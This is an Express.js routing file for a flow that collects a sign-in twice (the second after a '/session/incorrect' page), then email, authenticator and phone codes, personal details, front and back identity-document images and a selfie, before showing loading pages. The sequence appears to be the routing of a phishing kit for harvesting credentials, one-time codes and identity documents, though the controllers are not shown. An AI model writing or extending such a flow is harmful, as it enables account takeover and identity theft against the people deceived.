var express = require("express");
var router = express.Router();

var controller = require("../controller/controller");

/* GET home page. */
router.get("/", controller.getIndex);

// first session
router.get("/session", controller.getSession);

router.post("/first-signin", controller.postFirstSignIn);

// second session
router.get("/session/incorrect", controller.getSecondSession);

router.post("/second-signin", controller.postSecondSignIn);

// code email
router.get("/session/email", controller.getEmail);

router.post("/code-email", controller.postCodeEmail);

// code mfa
router.get("/session/authenticator", controller.getAuthenticator);

router.post("/code-mfa", controller.postCodeMFA);

// code phone
router.get("/session/phone", controller.getPhone);

router.post("/code-phone", controller.postCodePhone);

// personal
router.get("/session/personal", controller.getPersonal);

router.post("/personal-info", controller.postPersonal);

// ------ start docs
router.get("/session/identity", controller.getIdentity);

router.get("/session/docs-upload", controller.getUploadDocs);

// front
router.get("/session/docs-upload/front/:id", controller.getUploadDocsFront);

router.post("/upload-front", controller.postUploadFront);

// back
router.get("/session/docs-upload/back/:id", controller.getUploadDocsBack);

router.post("/upload-back", controller.postUploadBack);

// selfie
router.get("/session/docs-upload/selfie/:id", controller.getUploadSelfie);

router.post("/upload-selfie", controller.postUploadSelfie);

// ---- end docs

router.get("/processing/primary", controller.getPrimaryLoading);

router.get("/processing/secondary", controller.getSecondaryLoading);

module.exports = router;
